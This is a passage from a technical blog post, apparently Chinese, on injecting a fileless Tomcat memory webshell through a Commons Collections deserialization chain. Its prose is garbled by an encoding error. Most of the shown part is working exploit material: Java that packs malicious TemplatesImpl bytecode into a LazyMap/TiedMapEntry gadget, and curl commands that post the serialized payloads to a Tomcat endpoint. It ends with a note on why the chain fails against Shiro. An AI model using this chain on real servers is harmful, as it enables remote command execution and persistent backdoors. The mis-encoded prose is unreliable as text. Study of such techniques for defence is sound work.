</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> setFieldValue(Object obj, String fileNmae, Object value) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        Field field = obj.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(fileNmae);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">set</span>(obj,value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// æ„é€ æ¶æ„ TemplatesImpl å¯¹è±¡
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        TemplatesImpl obj = <span style="color:#fff;font-weight:bold">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// è·å–æ¶æ„ç±»çš„å­—èŠ‚ç 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/MemoryShell/target/classes/Evil/TomcatEchoInject.class&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[][] codes = {code};
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// åå°„ä¿®æ”¹å±æ€§
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_bytecodes&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> <span style="color:#fff;font-weight:bold">byte</span>[][] {code});
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;HelloTemplatesImpl&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_tfactory&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ================
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// åˆ©ç”¨ InvokerTransformer è°ƒç”¨ TemplatesImpl.newTransformer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;newTransformer&#34;, null, null);
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// tostrng
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        InvokerTransformer invokertransformer = <span style="color:#fff;font-weight:bold">new</span> InvokerTransformer(<span style="color:#0ff;font-weight:bold">&#34;toString&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> Class[<span style="color:#ff0;font-weight:bold">0</span>], <span style="color:#fff;font-weight:bold">new</span> Object[<span style="color:#ff0;font-weight:bold">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//===============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Map innerMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        Map outerMap = LazyMap.<span style="color:#007f7f">decorate</span>(innerMap, invokertransformer);
</span></span><span style="display:flex;"><span>        TiedMapEntry tme = <span style="color:#fff;font-weight:bold">new</span> TiedMapEntry(outerMap,<span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>);
</span></span><span style="display:flex;"><span>        Map expMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        expMap.<span style="color:#007f7f">put</span>(tme, <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>);
</span></span><span style="display:flex;"><span>        innerMap.<span style="color:#007f7f">remove</span>(obj);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue(invokertransformer, <span style="color:#0ff;font-weight:bold">&#34;iMethodName&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;newTransformer&#34;</span> );
</span></span><span style="display:flex;"><span>        setFieldValue(tme,<span style="color:#0ff;font-weight:bold">&#34;key&#34;</span>,obj);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ==============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>				
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(&#34;./TomcatEchoInject.ser&#34;));
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        ObjectOutputStream oss = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;./TomcatShellInject.ser&#34;</span>));
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">writeObject</span>(expMap);
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">close</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶ååˆ©ç”¨ curl è¿›è¡Œæ³¨å…¥å³å¯</p>
<p>é¦–å…ˆæ³¨å…¥<code> TomcatEchoInject.ser</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl http://localhost:8080/evil --data-binary &#34;@/Users/xxx/xxx/TomcatEchoInject.ser&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ³¨å…¥<code>TomcatShellInject.ser</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl http://localhost:8080/evil --data-binary &#34;@/Users/xxx/xxx/TomcatShellInject.ser&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150051140.png" alt="image-20230417150051140"  />
</p>
<p>å¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯æŠ¥é”™ï¼Œè¯´æ˜æ¶æ„çš„<code>AbstractTranslet</code>å·²æˆåŠŸååºåˆ—åŒ–ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150248445.png" alt="image-20230417150248445"  />
</p>
<p>å¹¶ä¸”åœ¨å†…å­˜ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ä¼˜å…ˆæ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„Filter:<code>TomcatShellInject</code>.</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150433182.png" alt="image-20230417150433182"  />
</p>
<p>ç„¶åå‘½ä»¤æ‰§è¡Œï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417150211328.png" alt="image-20230417150211328"  />
</p>
<h2 id="ç‘•ç–µ">ç‘•ç–µ<a hidden class="anchor" aria-hidden="true" href="#ç‘•ç–µ">#</a></h2>
<p>è¿™ç§åˆ©ç”¨æ–¹å¼å®ç°äº†æ— è½åœ°çš„å†…å­˜é©¬æ³¨å…¥ï¼Œä½†æ˜¯ä¹Ÿæœ‰å°ç¼ºé™·ï¼Œå¯¹äºShiroç»„ä»¶çš„ç³»ç»Ÿæ— æ³•å®ç°ï¼Œå› ä¸ºåœ¨<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>æ–¹æ³•ä¸­ï¼Œåœ¨å¯¹<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>èµ‹å€¼å‰ï¼Œä¼šå…ˆæ‰§è¡Œ<code>filter.doFilter(request, response, this)</code>ï¼Œæ‰§è¡Œå®Œæ‰€æœ‰çš„Filterã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417014616999.png" alt="image-20230417014616999"  />
</p>
<p>ä½†æ˜¯åœ¨<code>Shiro</code>ä¸­ï¼Œå…¶å®å°±æ˜¯è‡ªå·±å®ç°çš„filter</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417111016160.png" alt="image-20230417111016160"  />
</p>
<p>æˆ‘ä»¬çš„Shiroååºåˆ—åŒ–æ¼æ´è§¦å‘ç‚¹ï¼š<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>æ–¹æ³•é‡Œé¢è°ƒç”¨äº†<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code>æ–¹æ³•ï¼Œåœ¨é‡Œé¢å¯¹ä¼ å…¥çš„bytesè¿›è¡ŒAESè§£å¯†åè¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417111849641.png" alt="image-20230417111849641"  />
</p>
<p>Shiroçš„RemberMeåŠŸèƒ½å…¶å®åœ¨<code>org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal</code>æ–¹æ³•é‡Œé¢é€šè¿‡<code>createSubject</code>é‡Œé¢é€æ­¥å®ç°ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417111719177.png" alt="image-20230417111719177"  />
</p>
<p>å› æ­¤å¯¹äºShiroçš„ååºåˆ—åŒ–ï¼Œåœ¨å¯¹<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>èµ‹å€¼å‰ï¼Œå…ˆæ‰§è¡ŒShiroçš„Filterï¼Œåœ¨Filteré‡Œé¢å­˜åœ¨ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼Œè€Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>è¿˜æœªèµ‹å€¼ï¼Œå› æ­¤æ— æ³•é€šæ€Shiroã€‚</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">å†…å­˜é©¬</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="/posts/tech/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">Next Â»</span>
    <br>
    <span>Tomcatå†…å­˜é©¬</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
